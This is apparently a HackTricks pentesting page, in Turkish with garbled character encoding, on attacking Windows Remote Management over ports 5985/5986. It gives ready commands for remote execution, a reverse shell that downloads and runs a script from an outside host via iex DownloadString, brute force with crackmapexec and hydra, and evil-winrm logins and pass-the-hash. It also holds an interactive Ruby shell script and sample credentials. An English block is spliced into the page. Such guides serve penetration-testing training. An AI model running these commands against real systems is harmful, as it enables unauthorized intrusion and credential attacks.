# 5985,5986 - WinRM Pentesting

<details>

<summary><strong>AWS hackleme hakkÄ±nda sÄ±fÄ±rdan kahraman olmak iÃ§in</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>'Ä± Ã¶ÄŸrenin!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ±zÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi paylaÅŸarak** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na **katkÄ±da bulunun**.

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Deneyimli hackerlar ve Ã¶dÃ¼l avcÄ±larÄ± ile iletiÅŸim kurmak iÃ§in [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) sunucusuna katÄ±lÄ±n!

**Hacking Ä°Ã§gÃ¶rÃ¼leri**\
Hacking'in heyecanÄ±na ve zorluklarÄ±na dalmÄ±ÅŸ iÃ§eriklerle etkileÅŸim kurun

**GerÃ§ek ZamanlÄ± Hack Haberleri**\
HÄ±zlÄ± tempolu hacking dÃ¼nyasÄ±nÄ± gerÃ§ek zamanlÄ± haberler ve iÃ§gÃ¶rÃ¼lerle takip edin

**En Son Duyurular**\
Yeni Ã¶dÃ¼l avcÄ±larÄ±nÄ±n baÅŸlatÄ±ldÄ±ÄŸÄ± ve Ã¶nemli platform gÃ¼ncellemelerinin olduÄŸu en yeni duyurularla bilgilenin

**Bize katÄ±lÄ±n** [**Discord**](https://discord.com/invite/N3FrSbmwdy) ve bugÃ¼n en iyi hackerlarla iÅŸbirliÄŸi yapmaya baÅŸlayÄ±n!

## WinRM

[Windows Uzak YÃ¶netimi (WinRM)](https://msdn.microsoft.com/en-us/library/windows/desktop/aa384426\(v=vs.85\).aspx), Microsoft tarafÄ±ndan vurgulanan bir **protokoldÃ¼r** ve HTTP(S) Ã¼zerinden SOAP kullanarak Windows sistemlerinin uzaktan yÃ¶netimini saÄŸlar. Temel olarak WMI tarafÄ±ndan desteklenir ve WMI iÅŸlemleri iÃ§in HTTP tabanlÄ± bir arayÃ¼z olarak kendini sunar.

Bir makinede WinRM'nin bulunmasÄ±, diÄŸer iÅŸletim sistemleri iÃ§in SSH'nin nasÄ±l Ã§alÄ±ÅŸtÄ±ÄŸÄ±na benzer ÅŸekilde PowerShell aracÄ±lÄ±ÄŸÄ±yla kolay bir uzaktan yÃ¶netim saÄŸlar. WinRM'nin Ã§alÄ±ÅŸÄ±p Ã§alÄ±ÅŸmadÄ±ÄŸÄ±nÄ± belirlemek iÃ§in belirli portlarÄ±n aÃ§Ä±lÄ±p aÃ§Ä±lmadÄ±ÄŸÄ±nÄ±n kontrol edilmesi Ã¶nerilir:

* **5985/tcp (HTTP)**
* **5986/tcp (HTTPS)**

YukarÄ±daki listeden aÃ§Ä±k bir port, WinRM'nin kurulduÄŸunu ve dolayÄ±sÄ±yla uzaktan oturum baÅŸlatma giriÅŸimlerine izin verildiÄŸini gÃ¶sterir.

### **WinRM Oturumu BaÅŸlatma**

PowerShell'i WinRM iÃ§in yapÄ±landÄ±rmak iÃ§in Microsoft'un `Enable-PSRemoting` cmdlet'i devreye girer ve bilgisayarÄ± uzaktan PowerShell komutlarÄ±nÄ± kabul etmek Ã¼zere ayarlar. YÃ¼kseltilmiÅŸ PowerShell eriÅŸimi ile aÅŸaÄŸÄ±daki komutlar kullanÄ±larak bu iÅŸlevsellik etkinleÅŸtirilebilir ve herhangi bir ana bilgisayarÄ± gÃ¼venilir olarak belirlenebilir:
```powershell
Enable-PSRemoting -Force
Set-Item wsman:\localhost\client\trustedhosts *
```
Bu yaklaÅŸÄ±m, `trustedhosts` yapÄ±landÄ±rmasÄ±na bir joker karakter eklemeyi iÃ§erir. Bu adÄ±m, sonuÃ§larÄ±ndan dolayÄ± dikkatli bir ÅŸekilde dÃ¼ÅŸÃ¼nÃ¼lmesi gereken bir adÄ±mdÄ±r. AyrÄ±ca, saldÄ±rganÄ±n makinesinde aÄŸ tÃ¼rÃ¼nÃ¼n "Public"den "Work"e deÄŸiÅŸtirilmesi gerekebileceÄŸi belirtilmektedir.

AyrÄ±ca, WinRM, aÅŸaÄŸÄ±daki gibi gÃ¶sterildiÄŸi gibi `wmic` komutu kullanÄ±larak **uzaktan etkinleÅŸtirilebilir**:
```powershell
wmic /node:<REMOTE_HOST> process call create "powershell enable-psremoting -force"
```
Bu yÃ¶ntem, Windows makinelerini uzaktan yÃ¶netme esnekliÄŸini artÄ±rarak WinRM'nin uzaktan kurulumuna izin verir.


### YapÄ±landÄ±rÄ±ldÄ±ÄŸÄ± Test Edilir

SaldÄ±rÄ± makinenizin yapÄ±landÄ±rmasÄ±nÄ± doÄŸrulamak iÃ§in `Test-WSMan` komutu kullanÄ±lÄ±r ve hedefin WinRM'nin dÃ¼zgÃ¼n bir ÅŸekilde yapÄ±landÄ±rÄ±lÄ±p yapÄ±landÄ±rÄ±lmadÄ±ÄŸÄ±nÄ± kontrol etmek iÃ§in kullanÄ±lÄ±r. Bu komutu Ã§alÄ±ÅŸtÄ±rarak, baÅŸarÄ±lÄ± bir yapÄ±landÄ±rmayÄ± gÃ¶steren protokol sÃ¼rÃ¼mÃ¼ ve wsmid hakkÄ±nda ayrÄ±ntÄ±lar almanÄ±z beklenir. AÅŸaÄŸÄ±da, yapÄ±landÄ±rÄ±lmÄ±ÅŸ bir hedefe karÅŸÄ± yapÄ±landÄ±rÄ±lmamÄ±ÅŸ bir hedef iÃ§in beklenen Ã§Ä±ktÄ±yÄ± gÃ¶steren Ã¶rnekler bulunmaktadÄ±r:

- DoÄŸru ÅŸekilde yapÄ±landÄ±rÄ±lmÄ±ÅŸ bir hedef iÃ§in Ã§Ä±ktÄ± aÅŸaÄŸÄ±daki gibi olacaktÄ±r:
```bash
Test-WSMan <target-ip>
```
AÅŸaÄŸÄ±daki yanÄ±t, protokol sÃ¼rÃ¼mÃ¼ ve wsmid hakkÄ±nda bilgi iÃ§ermeli ve bu, WinRM'nin doÄŸru ÅŸekilde yapÄ±landÄ±rÄ±ldÄ±ÄŸÄ±nÄ± gÃ¶stermelidir.

![](<../.gitbook/assets/image (161) (1).png>)

- Tersine, WinRM iÃ§in yapÄ±landÄ±rÄ±lmamÄ±ÅŸ bir hedef iÃ§in ayrÄ±ntÄ±lÄ± bilgi olmadan sonuÃ§lanÄ±r, bu da uygun bir WinRM yapÄ±landÄ±rmasÄ±nÄ±n olmadÄ±ÄŸÄ±nÄ± vurgular.

![](<../.gitbook/assets/image (162).png>)

### Bir komutu Ã§alÄ±ÅŸtÄ±rma

Bir hedef makinede uzaktan `ipconfig` komutunu Ã§alÄ±ÅŸtÄ±rmak ve Ã§Ä±ktÄ±sÄ±nÄ± gÃ¶rÃ¼ntÃ¼lemek iÃ§in ÅŸunu yapÄ±n:
```powershell
Invoke-Command -computername computer-name.domain.tld -ScriptBlock {ipconfig /all} [-credential DOMAIN\username]
```
![](<../.gitbook/assets/image (163) (1).png>)

AyrÄ±ca, mevcut PS konsolunuzda bir komutu **Invoke-Command** ile Ã§alÄ±ÅŸtÄ±rabilirsiniz. Diyelim ki yerel olarak _enumeration_ adÄ±nda bir fonksiyonunuz var ve bunu uzaktaki bir bilgisayarda Ã§alÄ±ÅŸtÄ±rmak istiyorsunuz, ÅŸunu yapabilirsiniz:
```powershell
Invoke-Command -ComputerName <computername> -ScriptBLock ${function:enumeration} [-ArgumentList "arguments"]
```
To execute a script on a target machine using WinRM, you can use the `Invoke-Command` cmdlet in PowerShell. This cmdlet allows you to run commands or scripts on remote machines.

Here is an example of how to execute a script using WinRM:

```powershell
Invoke-Command -ComputerName <target_ip> -ScriptBlock { <script_content> }
```

Replace `<target_ip>` with the IP address of the target machine and `<script_content>` with the actual content of your script.

Make sure that WinRM is enabled on the target machine and that you have the necessary permissions to execute scripts remotely.
```powershell
Invoke-Command -ComputerName <computername> -FilePath C:\path\to\script\file [-credential CSCOU\jarrieta]
```
### Ters kabuk alÄ±n

WinRM, Windows iÅŸletim sistemlerinde uzaktan yÃ¶netim saÄŸlayan bir protokoldÃ¼r. WinRM, birÃ§ok farklÄ± iÅŸletim sistemi sÃ¼rÃ¼mÃ¼nde varsayÄ±lan olarak etkinleÅŸtirilmiÅŸtir ve genellikle 5985 ve 5986 numaralÄ± baÄŸlantÄ± noktalarÄ±nÄ± kullanÄ±r.

WinRM Ã¼zerinde ters kabuk almak iÃ§in aÅŸaÄŸÄ±daki adÄ±mlarÄ± izleyebilirsiniz:

1. Ä°lk olarak, hedef Windows makinesine eriÅŸiminiz olmalÄ±dÄ±r. Bu, hedef makineye doÄŸrudan fiziksel eriÅŸim, aynÄ± aÄŸda bulunan bir makineden eriÅŸim veya hedef makineye bir exploit kullanarak eriÅŸim saÄŸlamak olabilir.

2. WinRM'yi kullanarak ters kabuk almak iÃ§in, hedef makinede WinRM hizmetinin etkinleÅŸtirilmiÅŸ olmasÄ± gerekmektedir. EÄŸer etkinleÅŸtirilmemiÅŸse, hedef makinede WinRM hizmetini etkinleÅŸtirmeniz gerekecektir.

3. Ters kabuk almak iÃ§in bir payload oluÅŸturmanÄ±z gerekmektedir. Bu, genellikle bir ters kabuk payloadu oluÅŸturan bir araÃ§ kullanÄ±larak yapÄ±lÄ±r. Ã–rneÄŸin, Metasploit Framework veya PowerShell Empire gibi araÃ§lar kullanÄ±labilir.

4. OluÅŸturulan payload, hedef makineye gÃ¶nderilmelidir. Bu, bir exploit kullanarak veya baÅŸka bir yÃ¶ntemle yapÄ±labilir.

5. Hedef makinede payload Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nda, ters kabuk otomatik olarak oluÅŸturulacak ve saldÄ±rganÄ±n kontrol paneline baÄŸlanacaktÄ±r.

Ters kabuk alma iÅŸlemi, hedef makinedeki yetkilendirme dÃ¼zeyine baÄŸlÄ± olarak farklÄ± ÅŸekillerde gerÃ§ekleÅŸtirilebilir. Ã–rneÄŸin, hedef makinede yÃ¶netici ayrÄ±calÄ±klarÄ±na sahipseniz, tam yetkiyle Ã§alÄ±ÅŸan bir ters kabuk alabilirsiniz. Ancak, sÄ±nÄ±rlÄ± bir kullanÄ±cÄ± hesabÄ±yla Ã§alÄ±ÅŸÄ±yorsanÄ±z, sÄ±nÄ±rlÄ± yetkilere sahip bir ters kabuk almanÄ±z gerekecektir.

Ters kabuk alma iÅŸlemi, yasal ve etik sÄ±nÄ±rlar iÃ§inde gerÃ§ekleÅŸtirilmelidir. Sadece yetkilendirilmiÅŸ sistemlerde ve izin alÄ±nmÄ±ÅŸ aÄŸlarda kullanÄ±lmalÄ±dÄ±r. Aksi takdirde, yasal sonuÃ§larla karÅŸÄ±laÅŸabilirsiniz.
```powershell
Invoke-Command -ComputerName <computername> -ScriptBlock {cmd /c "powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.10.10:8080/ipst.ps1')"}
```
### Bir PS oturumu alÄ±n

EtkileÅŸimli bir PowerShell kabuÄŸu almak iÃ§in `Enter-PSSession` komutunu kullanÄ±n:
```powershell
#If you need to use different creds
$password=ConvertTo-SecureString 'Stud41Password@123' -Asplaintext -force
## Note the ".\" in the suername to indicate it's a local user (host domain)
$creds2=New-Object System.Management.Automation.PSCredential(".\student41", $password)

# Enter
Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local [-Credential username]
## Bypass proxy
Enter-PSSession -ComputerName 1.1.1.1 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
# Save session in var
$sess = New-PSSession -ComputerName 1.1.1.1 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
Enter-PSSession $sess
## Background current PS session
Exit-PSSession # This will leave it in background if it's inside an env var (New-PSSession...)
```
![](<../.gitbook/assets/image (164).png>)

**Oturum, "hedef" iÃ§inde yeni bir iÅŸlemde (wsmprovhost) Ã§alÄ±ÅŸacak**

### **WinRM'yi Zorlama**

PS Remoting ve WinRM'yi kullanmak iÃ§in bilgisayar yapÄ±landÄ±rÄ±lmamÄ±ÅŸ olsa bile, aÅŸaÄŸÄ±daki komutu kullanarak etkinleÅŸtirebilirsiniz:
```powershell
.\PsExec.exe \\computername -u domain\username -p password -h -d powershell.exe "enable-psremoting -force"
```
### OturumlarÄ± Kaydetme ve Geri YÃ¼kleme

Bu, uzak bilgisayarda dil sÄ±nÄ±rlamasÄ± varsa **Ã§alÄ±ÅŸmayacaktÄ±r**.
```powershell
#If you need to use different creds
$password=ConvertTo-SecureString 'Stud41Password@123' -Asplaintext -force
## Note the ".\" in the suername to indicate it's a local user (host domain)
$creds2=New-Object System.Management.Automation.PSCredential(".\student41", $password)

#You can save a session inside a variable
$sess1 = New-PSSession -ComputerName <computername> [-SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)]
#And restore it at any moment doing
Enter-PSSession -Session $sess1
```
Bu oturumlar iÃ§inde _Invoke-Command_ kullanarak PS komut dosyalarÄ±nÄ± yÃ¼kleyebilirsiniz.
```powershell
Invoke-Command -FilePath C:\Path\to\script.ps1 -Session $sess1
```
### Hatalar

AÅŸaÄŸÄ±daki hatayÄ± bulursanÄ±z:

`enter-pssession : Uzak sunucuya 10.10.10.175 baÄŸlantÄ±sÄ± aÅŸaÄŸÄ±daki hata ile baÅŸarÄ±sÄ±z oldu: WinRM istemcisi isteÄŸi iÅŸleyemez. Kimlik doÄŸrulama ÅŸemasÄ± Kerberos'tan farklÄ± ise veya istemci bilgisayarÄ± bir etki alanÄ±na katÄ±lmamÄ±ÅŸsa, HTTPS taÅŸÄ±masÄ± kullanÄ±lmalÄ± veya hedef makine GÃ¼venilen Ana Makineler yapÄ±landÄ±rma ayarÄ±na eklenmelidir. GÃ¼venilen Ana Makineler listesindeki bilgisayarlar kimlik doÄŸrulanmayabilir. Bu konuda daha fazla bilgi almak iÃ§in aÅŸaÄŸÄ±daki komutu Ã§alÄ±ÅŸtÄ±rarak daha fazla bilgi alabilirsiniz: winrm help config. Daha fazla bilgi iÃ§in about_Remote_Troubleshooting YardÄ±m konusuna bakÄ±n.`

Ä°stemci Ã¼zerinde deneyin ([buradan](https://serverfault.com/questions/657918/remote-ps-session-fails-on-non-domain-server) bilgi alÄ±nmÄ±ÅŸtÄ±r):
```ruby
winrm quickconfig
winrm set winrm/config/client '@{TrustedHosts="Computer1,Computer2"}'
```
<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Deneyimli hackerlar ve hata Ã¶dÃ¼l avcÄ±larÄ±yla iletiÅŸim kurmak iÃ§in [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) sunucusuna katÄ±lÄ±n!

**Hacking Ä°Ã§gÃ¶rÃ¼leri**\
Hacking'in heyecanÄ±na ve zorluklarÄ±na dalmÄ±ÅŸ iÃ§eriklerle etkileÅŸim kurun

**GerÃ§ek ZamanlÄ± Hack Haberleri**\
GerÃ§ek zamanlÄ± haberler ve iÃ§gÃ¶rÃ¼ler aracÄ±lÄ±ÄŸÄ±yla hÄ±zlÄ± tempolu hacking dÃ¼nyasÄ±nda gÃ¼ncel kalÄ±n

**En Son Duyurular**\
Yeni hata Ã¶dÃ¼lleri ve Ã¶nemli platform gÃ¼ncellemeleri hakkÄ±nda bilgilendirilin

Bize [**Discord**](https://discord.com/invite/N3FrSbmwdy) Ã¼zerinden katÄ±lÄ±n ve bugÃ¼n en iyi hackerlarla iÅŸbirliÄŸi yapmaya baÅŸlayÄ±n!

## Linux'ta WinRM baÄŸlantÄ±sÄ±

### Brute Force

Dikkatli olun, winrm brute force saldÄ±rÄ±larÄ± kullanÄ±cÄ±larÄ± engelleyebilir.
```ruby
#Brute force
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt

#Just check a pair of credentials
# Username + Password + CMD command execution
crackmapexec winrm <IP> -d <Domain Name> -u <username> -p <password> -x "whoami"
# Username + Hash + PS command execution
crackmapexec winrm <IP> -d <Domain Name> -u <username> -H <HASH> -X '$PSVersionTable'
#Crackmapexec won't give you an interactive shell, but it will check if the creds are valid to access winrm
```
### evil-winrm KullanÄ±mÄ±

evil-winrm, Windows Remote Management (WinRM) protokolÃ¼nÃ¼ kÃ¶tÃ¼ niyetli amaÃ§larla kullanmak iÃ§in kullanÄ±lan bir araÃ§tÄ±r. Bu araÃ§, bir hedef Windows makinesine yetkisiz eriÅŸim saÄŸlamak iÃ§in kullanÄ±labilir.

#### Kurulum

evil-winrm'yi kullanmak iÃ§in Ã¶ncelikle Ruby programlama dilini ve gerekli baÄŸÄ±mlÄ±lÄ±klarÄ±nÄ± kurmanÄ±z gerekmektedir. ArdÄ±ndan, evil-winrm'yi Ruby Gem paket yÃ¶neticisi aracÄ±lÄ±ÄŸÄ±yla yÃ¼kleyebilirsiniz.

```plaintext
gem install evil-winrm
```

#### KullanÄ±m

evil-winrm'yi kullanarak hedef bir Windows makinesine baÄŸlanmak iÃ§in aÅŸaÄŸÄ±daki komutu kullanabilirsiniz:

```plaintext
evil-winrm -i <hedef_IP_adresi> -u <kullanÄ±cÄ±_adÄ±> -p <parola>
```

Bu komutu Ã§alÄ±ÅŸtÄ±rdÄ±ktan sonra, hedef Windows makinesine baÄŸlanacak ve bir komut istemi alacaksÄ±nÄ±z. ArtÄ±k hedef makine Ã¼zerinde komutlar Ã§alÄ±ÅŸtÄ±rabilir ve sistemde istediÄŸiniz deÄŸiÅŸiklikleri yapabilirsiniz.

#### Ã–rnek KullanÄ±m

AÅŸaÄŸÄ±daki Ã¶rnek, evil-winrm'yi kullanarak hedef bir Windows makinesine baÄŸlanmayÄ± gÃ¶stermektedir:

```plaintext
evil-winrm -i 192.168.1.10 -u administrator -p P@ssw0rd
```

Bu komutu Ã§alÄ±ÅŸtÄ±rdÄ±ktan sonra, hedef Windows makinesine baÄŸlanacak ve administrator kullanÄ±cÄ±sÄ±yla oturum aÃ§acaksÄ±nÄ±z. ArtÄ±k hedef makine Ã¼zerinde komutlar Ã§alÄ±ÅŸtÄ±rabilir ve sistemde istediÄŸiniz deÄŸiÅŸiklikleri yapabilirsiniz.
```ruby
gem install evil-winrm
```
**DÃ¶kÃ¼mantasyonu** GitHub Ã¼zerinden okuyun: [https://github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)
```ruby
evil-winrm -u Administrator -p 'EverybodyWantsToWorkAtP.O.O.'  -i <IP>/<Domain>
```
**IPv6 adresi** ile baÄŸlantÄ± kurmak iÃ§in evil-winrm kullanmak iÃ§in, bir **etki alanÄ± adÄ±nÄ±** IPv6 adresine ayarlayan bir giriÅŸ oluÅŸturun ve o etki alanÄ±na baÄŸlanÄ±n.

### evil-winrm ile hash geÃ§irme
```ruby
evil-winrm -u <username> -H <Hash> -i <IP>
```
![](<../.gitbook/assets/image (173).png>)

### Bir PS-docker makinesi kullanma
```
docker run -it quickbreach/powershell-ntlm
$creds = Get-Credential
Enter-PSSession -ComputerName 10.10.10.149 -Authentication Negotiate -Credential $creds
```
### Bir ruby betiÄŸi kullanarak

**Kod buradan alÄ±nmÄ±ÅŸtÄ±r: [https://alamot.github.io/winrm\_shell/](https://alamot.github.io/winrm\_shell/)**
```ruby
require 'winrm-fs'

# Author: Alamot
# To upload a file type: UPLOAD local_path remote_path
# e.g.: PS> UPLOAD myfile.txt C:\temp\myfile.txt
# https://alamot.github.io/winrm_shell/


conn = WinRM::Connection.new(
endpoint: 'https://IP:PORT/wsman',
transport: :ssl,
user: 'username',
password: 'password',
:no_ssl_peer_verification => true
)


class String
def tokenize
self.
split(/\s(?=(?:[^'"]|'[^']*'|"[^"]*")*$)/).
select {|s| not s.empty? }.
map {|s| s.gsub(/(^ +)|( +$)|(^["']+)|(["']+$)/,'')}
end
end


command=""
file_manager = WinRM::FS::FileManager.new(conn)


conn.shell(:powershell) do |shell|
until command == "exit\n" do
output = shell.run("-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')")
print(output.output.chomp)
command = gets
if command.start_with?('UPLOAD') then
upload_command = command.tokenize
print("Uploading " + upload_command[1] + " to " + upload_command[2])
file_manager.upload(upload_command[1], upload_command[2]) do |bytes_copied, total_bytes, local_path, remote_path|
puts("#{bytes_copied} bytes of #{total_bytes} bytes copied")
end
command = "echo `nOK`n"
end
output = shell.run(command) do |stdout, stderr|
STDOUT.print(stdout)
STDERR.print(stderr)
end
end
puts("Exiting with code #{output.exitcode}")
end
```
## Shodan

* `port:5985 Microsoft-HTTPAPI`

## Referanslar

* [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/)

## HackTricks Otomatik KomutlarÄ±
```
Protocol_Name: WinRM    #Protocol Abbreviation if there is one.
Port_Number:  5985     #Comma separated if there is more than one.
Protocol_Description: Windows Remote Managment        #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for WinRM
Note: |
Windows Remote Management (WinRM) is a Microsoft protocol that allows remote management of Windows machines over HTTP(S) using SOAP. On the backend it's utilising WMI, so you can think of it as an HTTP based API for WMI.

sudo gem install winrm winrm-fs colorize stringio
git clone https://github.com/Hackplayers/evil-winrm.git
cd evil-winrm
ruby evil-winrm.rb -i 192.168.1.100 -u Administrator -p â€˜MySuperSecr3tPass123!â€™

https://kalilinuxtutorials.com/evil-winrm-hacking-pentesting/

ruby evil-winrm.rb -i 10.10.10.169 -u melanie -p 'Welcome123!' -e /root/Desktop/Machines/HTB/Resolute/
^^so you can upload binary's from that directory        or -s to upload scripts (sherlock)
menu
invoke-binary `tab`

#python3
import winrm
s = winrm.Session('windows-host.example.com', auth=('john.smith', 'secret'))
print(s.run_cmd('ipconfig'))
print(s.run_ps('ipconfig'))

https://book.hacktricks.xyz/pentesting/pentesting-winrm

Entry_2:
Name: Hydra Brute Force
Description: Need User
Command: hydra -t 1 -V -f -l {Username} -P {Big_Passwordlist} rdp://{IP}
```
<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Deneyimli hackerlar ve Ã¶dÃ¼l avcÄ±larÄ± ile iletiÅŸim kurmak iÃ§in [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) sunucusuna katÄ±lÄ±n!

**Hacking Ä°Ã§gÃ¶rÃ¼leri**\
Hacking'in heyecanÄ±na ve zorluklarÄ±na dalmÄ±ÅŸ iÃ§eriklerle etkileÅŸim kurun

**GerÃ§ek ZamanlÄ± Hack Haberleri**\
GerÃ§ek zamanlÄ± haberler ve iÃ§gÃ¶rÃ¼ler aracÄ±lÄ±ÄŸÄ±yla hÄ±zlÄ± tempolu hacking dÃ¼nyasÄ±nda gÃ¼ncel kalÄ±n

**En Son Duyurular**\
Yeni Ã¶dÃ¼l avcÄ±larÄ±nÄ±n baÅŸlatÄ±lmasÄ± ve Ã¶nemli platform gÃ¼ncellemeleri hakkÄ±nda bilgi edinin

**Bize katÄ±lÄ±n** [**Discord**](https://discord.com/invite/N3FrSbmwdy) ve bugÃ¼n en iyi hackerlarla iÅŸbirliÄŸi yapmaya baÅŸlayÄ±n!

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* Åirketinizi **HackTricks'te reklam vermek isterseniz** veya **HackTricks'i PDF olarak indirmek isterseniz** [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya bizi **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**'da takip edin.**
* Hacking hilelerinizi paylaÅŸarak PR'lar gÃ¶ndererek [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>
